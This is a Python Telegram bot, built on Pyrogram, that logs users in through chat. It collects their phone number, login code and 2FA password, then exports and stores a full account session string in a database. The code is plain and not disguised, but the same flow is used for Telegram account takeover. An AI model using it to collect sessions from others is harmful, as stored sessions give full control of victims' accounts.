import os
import asyncio
import pyromod.listen # Enables client.ask()
from pyrogram import Client, filters
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid
from db import save_session

API_ID = os.environ.get("API_ID")
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")

app = Client("login_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("add_account") & filters.private)
async def login_handler(client, message):
    user_id = message.from_user.id
    
    # 1. Ask for Phone Number
    phone_msg = await client.ask(message.chat.id, "Send your phone number (with country code, e.g., +91...):")
    phone_number = phone_msg.text.strip()

    # Create a temporary in-memory client to generate the session
    temp_client = Client(f"temp_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    await temp_client.connect()

    try:
        # 2. Send the OTP code
        sent_code = await temp_client.send_code(phone_number)
        
        # 3. Ask user for the OTP code
        otp_msg = await client.ask(
            message.chat.id, 
            "I sent an OTP to your Telegram account. Please send it here.\n*(If it contains spaces, just type the numbers)*"
        )
        otp = otp_msg.text.replace(" ", "")

        # 4. Attempt Sign In
        try:
            await temp_client.sign_in(phone_number, sent_code.phone_code_hash, otp)
        except SessionPasswordNeeded:
            # 5. Handle 2FA Password
            pwd_msg = await client.ask(message.chat.id, "Your account has 2FA enabled. Please send your password:")
            await temp_client.check_password(pwd_msg.text)
        except PhoneCodeInvalid:
            await message.reply_text("Invalid OTP. Try again /add_account")
            return

        # 6. Extract Session String and Save to MongoDB
        session_string = await temp_client.export_session_string()
        await save_session(user_id, phone_number, session_string)
        
        await message.reply_text("✅ Account successfully added and saved to database!")

    except Exception as e:
        await message.reply_text(f"An error occurred: {e}")
    finally:
        await temp_client.disconnect()

if __name__ == "__main__":
    print("Login Bot Running...")
    app.run()
